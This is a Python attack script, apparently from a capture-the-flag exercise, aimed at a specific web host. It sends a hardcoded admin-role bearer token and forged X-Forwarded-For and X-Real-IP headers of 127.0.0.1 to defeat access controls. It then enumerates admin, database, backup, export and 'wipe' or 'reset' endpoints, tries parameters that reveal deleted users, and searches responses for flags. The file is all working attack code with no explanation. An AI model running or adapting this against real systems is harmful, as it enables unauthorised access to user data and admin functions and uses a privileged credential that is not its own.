#!/usr/bin/env python3
"""
Find ALL databases and endpoints - avoid honeypots
"""

import requests
import json

base_url = "http://fresh-start-267.emergent.host"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYTcyMWZjYzEtMTk5OS00NGViLWJjOTQtMDU0YjU4N2E2MDUzIiwiZW1haWwiOiJhZG1pbkBldGhhcmEuYWkiLCJuYW1lIjoiU3lzdGVtIEFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzc3NTMzMTI2fQ.Lu6aYqa4j4EQHX463APGH0n73p_ziCQn3luWUSi-61U"

headers = {
    "Authorization": f"Bearer {token}",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
}

print("="*70)
print("FINDING ALL DATABASES AND ENDPOINTS")
print("="*70)

# Comprehensive endpoint list
endpoints = [
    # User endpoints
    '/api/users',
    '/api/users/all',
    '/api/users/active',
    '/api/users/inactive',
    '/api/users/deleted',
    '/api/admin/users',
    '/api/admin/users/all',
    
    # Task endpoints
    '/api/tasks',
    '/api/tasks/all',
    '/api/admin/tasks',
    
    # Database endpoints
    '/api/database',
    '/api/db',
    '/api/admin/database',
    '/api/admin/db',
    '/api/admin/database/users',
    '/api/admin/database/tasks',
    '/api/admin/database/all',
    '/api/admin/database/wipe',
    '/api/admin/database/clear',
    '/api/admin/database/reset',
    
    # Data endpoints
    '/api/data',
    '/api/admin/data',
    '/api/admin/data/users',
    '/api/admin/data/tasks',
    
    # Collection endpoints
    '/api/collections',
    '/api/admin/collections',
    
    # Stats/Info endpoints
    '/api/stats',
    '/api/admin/stats',
    '/api/info',
    '/api/admin/info',
    '/api/status',
    '/api/admin/status',
    '/api/health',
    
    # Backup/Export endpoints
    '/api/backup',
    '/api/export',
    '/api/admin/backup',
    '/api/admin/export',
    
    # Flag endpoints
    '/api/flag',
    '/api/admin/flag',
    '/flag',
    '/admin/flag',
    '/api/success',
    '/api/admin/success',
]

found_endpoints = []

print("\n[1] Scanning endpoints...")
for endpoint in endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        
        if resp.status_code in [200, 201]:
            print(f"[+] {endpoint} - {resp.status_code}")
            
            try:
                data = resp.json()
                
                # Check if it's a list
                if isinstance(data, list):
                    print(f"    List with {len(data)} items")
                    found_endpoints.append({
                        'endpoint': endpoint,
                        'type': 'list',
                        'count': len(data),
                        'sample': data[:2] if len(data) > 0 else []
                    })
                
                # Check if it's a dict
                elif isinstance(data, dict):
                    print(f"    Dict: {list(data.keys())[:5]}")
                    found_endpoints.append({
                        'endpoint': endpoint,
                        'type': 'dict',
                        'keys': list(data.keys()),
                        'data': data
                    })
                    
                    # Check for flag
                    json_str = json.dumps(data).lower()
                    if 'flag{' in json_str or 'ethara{' in json_str:
                        print(f"    [!!!] POSSIBLE FLAG FOUND!")
                        print(f"    {json.dumps(data, indent=2)[:500]}")
                
            except:
                print(f"    Non-JSON response: {resp.text[:100]}")
                
    except Exception as e:
        pass

print(f"\n[2] Found {len(found_endpoints)} active endpoints")

# Try to find real database operations
print("\n[3] Testing database operations...")

# Try different query parameters
query_params = [
    '?include_deleted=true',
    '?show_all=true',
    '?all=true',
    '?deleted=true',
    '?inactive=true',
    '?active=false',
]

for param in query_params:
    try:
        resp = requests.get(f"{base_url}/api/users{param}", headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            print(f"[+] /api/users{param} - {len(data)} items")
    except:
        pass

# Try to find database schema
print("\n[4] Looking for database schema...")
schema_endpoints = [
    '/api/schema',
    '/api/admin/schema',
    '/api/database/schema',
    '/api/admin/database/schema',
    '/.well-known/schema',
    '/docs',
    '/api/docs',
    '/openapi.json',
    '/api/openapi.json',
]

for endpoint in schema_endpoints:
    try:
        resp = requests.get(f"{base_url}{endpoint}", headers=headers, timeout=5)
        if resp.status_code == 200:
            print(f"[+] Found: {endpoint}")
            print(f"    {resp.text[:200]}")
    except:
        pass

print("\n" + "="*70)
print("SCAN COMPLETE")
print("="*70)
